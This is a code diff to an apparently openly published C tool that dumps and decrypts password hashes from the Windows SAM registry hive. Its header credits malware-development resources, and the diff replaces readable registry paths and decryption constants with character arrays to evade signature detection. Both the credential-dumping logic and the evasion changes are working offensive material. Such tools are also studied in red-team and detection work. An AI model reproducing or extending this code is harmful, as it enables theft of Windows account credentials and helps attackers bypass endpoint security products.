@@ -1,6 +1,5 @@
 // Peter Gabaldon. https://pgj11.com/.
-// Dumping SAM with clean indirect syscalls, custom call stacks, API hashing and walking PEB. Thanks to this resources
-// https://github.com/Maldev-Academy/HellHall
+// Dumping SAM with custom call stacks, API hashing and walking PEB. Thanks to this resources
 // https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/
 // https://0xdarkvortex.dev/hiding-in-plainsight/
 // https://0xpat.github.io/Malware_development_part_4/
@@ -127,7 +126,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 	PKEY_FULL_INFORMATION keyInfoSubKeyF = NULL;
 	PKEY_BASIC_INFORMATION keyInfoSubKeysBasic = NULL;
 	PKEY_VALUE_FULL_INFORMATION keyValuesSubKey = NULL;
-	WCHAR RegPath[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users";
+	WCHAR RegPath[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\',L'U',L's',L'e',L'r',L's',L'\\', L'\0' };
 	DWORD maxLenOfNames;
 	ULONG nEntries = 0;
 	PSAM sams[MAX_SAM_ENTRIES] = {};
@@ -168,7 +167,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 		}
 
 		if (wcsncmp(L"00", keyInfoSubKeysBasic->Name, wcslen(L"00")) == 0) {
-			WCHAR RegPathSubKeyV[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\Users\\";
+			WCHAR RegPathSubKeyV[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\',L'U',L's',L'e',L'r',L's',L'\\', L'\0' };
 			wcsncat_s(RegPathSubKeyV, MAX_PATH, keyInfoSubKeysBasic->Name, _TRUNCATE);
 
 			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyV, RegPathSubKeyV);
@@ -213,7 +212,7 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 				}
 				HeapFree(GetProcessHeap(), 0, keyValuesSubKey);
 			}
-			WCHAR RegPathSubKeyF[MAX_PATH] = L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\\";
+			WCHAR RegPathSubKeyF[MAX_PATH] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'A',L'M',L'\\',L'S',L'A',L'M',L'\\',L'D',L'o',L'm',L'a',L'i',L'n',L's',L'\\',L'A',L'c',L'c',L'o',L'u',L'n',L't',L'\\', L'\0' };
 			pMyRtlInitUnicodeString(&UnicodeRegPathSubKeyF, RegPathSubKeyF);
 			InitializeObjectAttributes(&attributesSubKeyF, &UnicodeRegPathSubKeyF, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
@@ -280,9 +279,9 @@ void getSAM(PSAM samRegEntries[], PULONG size) {
 
 
 void decryptSAM(PSAM samRegEntries[], int entries) {
-	CHAR strMagic1[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
-	CHAR strMagic2[] = "0123456789012345678901234567890123456789";
-	CHAR strMagic3[] = "NTPASSWORD";
+	CHAR strMagic1[] = { '!','@','#','$','%','^','&','*','(',')','q','w','e','r','t','y','U','I','O','P','A','z','x','c','v','b','n','m','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q','Q',')','(','*','@','&','%', '\0' };
+	CHAR strMagic2[] = { '0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9','0','1','2','3','4','5','6','7','8','9', '\0' };
+	CHAR strMagic3[] = { 'N','T','P','A','S','S','W','O','R','D', '\0'};
 
 	for (int i = 0; i < entries; i++) {
 		LONG offset = 0;
@@ -483,7 +482,7 @@ void getClasses(PSAM samRegEntry) {
 
 	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };
 
-	WCHAR Reg[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
+	WCHAR Reg[] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\\', L'\0'};
 
 	WCHAR resul[MAX_KEY_VALUE_LENGTH] = L"\0";
 
